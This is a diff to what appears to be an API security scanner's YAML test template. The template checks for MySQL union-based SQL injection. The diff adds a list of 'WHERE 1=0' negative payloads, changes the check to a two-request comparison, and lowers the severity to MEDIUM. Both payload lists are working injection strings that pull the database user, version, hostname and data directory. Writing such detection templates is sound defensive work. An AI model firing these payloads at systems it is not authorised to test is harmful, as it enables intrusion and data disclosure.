@@ -13,7 +13,7 @@ info:
     shortName: Broken Authentication
     displayName: Broken User Authentication (BUA)
   subCategory: UNION_INLINE_COMMENT_BASED_MYSQLI
-  severity: HIGH
+  severity: MEDIUM
   tags:
     - Business logic
     - OWASP top 10
@@ -37,7 +37,7 @@ api_selection_filters:
   response_payload:
     length:
       gt: 0
-    not_contains_either:
+    not_contains:
       - Error
       - Internal Server 
       - Failed
@@ -89,55 +89,96 @@ wordLists:
     - "' UNION/**/SELECT/**/1, user(), now()--"
     - "' UNION/**/SELECT/**/1, user(), tmpdir()--"
     - "' UNION/**/SELECT/**/1, user(), version_comment()--"
+  unionBasedNegativePayloads:
+    - "' UNION/**/SELECT/**/1, user(), version() WHERE 1=0--"
+    - "' UNION/**/SELECT/**/1, database(), version() WHERE 1=0--"
+    - "' UNION/**/SELECT/**/1, current_user(), version() WHERE 1=0--"
+    - "' UNION/**/SELECT/**/1, user(), schema() WHERE 1=0--"
+    - "' UNION/**/SELECT/**/1, user(), hostname() WHERE 1=0--"
+    - "' UNION/**/SELECT/**/1, user(), datadir() WHERE 1=0--"
+    - "' UNION/**/SELECT/**/1, user(), session_user() WHERE 1=0--"
+    - "' UNION/**/SELECT/**/1, user(), now() WHERE 1=0--"
+    - "' UNION/**/SELECT/**/1, user(), tmpdir() WHERE 1=0--"
+    - "' UNION/**/SELECT/**/1, user(), version_comment() WHERE 1=0--"
 execute:
-  type: single
+  type: multiple
   requests:
   - req:
     - modify_body_param:
         userKey: ${userVal}${unionBasedPayloads}
+    - validate:
+        response_code:
+          gte: 200
+          lt: 300
+        response_payload:
+          length:
+            gt: 0
+          not_contains:
+            - Error
+            - Internal Server 
+            - Failed
+            - Unauthorized
+            - access denied
+            - Forbidden
+            - Method Not allowed
+            - Gateway timeout
+            - request timeout
+            - server error
+            - server busy
+            - authentication error
+            - authorization error
+            - validation error
+            - Permission Denied
+            - invalid token
+            - token expired
+            - session expired
+            - session timeout
+            - unexpected error
+            - unable to process request
+            - bad request
+            - service unavailable
+            - account is locked
+            - account is blocked
+            - multiple failed attempts
+    - success: x2
+    - failure: exit
+  - req:
+    - modify_body_param:
+        userKey: ${userVal}${unionBasedNegativePayloads}
+    - validate:
+        response_code:
+          gte: 200
+          lt: 300
+        response_payload:
+          length:
+            gt: 0  
+          not_contains:
+            - Error
+            - Internal Server 
+            - Failed
+            - Unauthorized
+            - access denied
+            - Forbidden
+            - Method Not allowed
+            - Gateway timeout
+            - request timeout
+            - server error
+            - server busy
+            - authentication error
+            - authorization error
+            - validation error
+            - Permission Denied
+            - invalid token
+            - token expired
+            - session expired
+            - session timeout
+            - unexpected error
+            - unable to process request
+            - bad request
+            - service unavailable
+            - account is locked
+            - account is blocked
+            - multiple failed attempts    
+          neq: "${x1.response.body}"
+    - success: vulnerable
         
-validate:
-  response_code:
-    gte: 200
-    lt: 300
-  response_payload:
-    length:
-      gt: 0
-    not_contains_either:
-      - Error
-      - Internal Server 
-      - Failed
-      - Unauthorized
-      - access denied
-      - Forbidden
-      - Method Not allowed
-      - Gateway timeout
-      - request timeout
-      - server error
-      - server busy
-      - authentication error
-      - authorization error
-      - validation error
-      - Permission Denied
-      - invalid token
-      - token expired
-      - session expired
-      - session timeout
-      - unexpected error
-      - unable to process request
-      - bad request
-      - service unavailable
-      - account is locked
-      - account is blocked
-      - multiple failed attempts
-    contains_either:
-      - version
-      - database
-      - user
-      - time
-      - schema
-      - table
-      - host
-
-  
-  
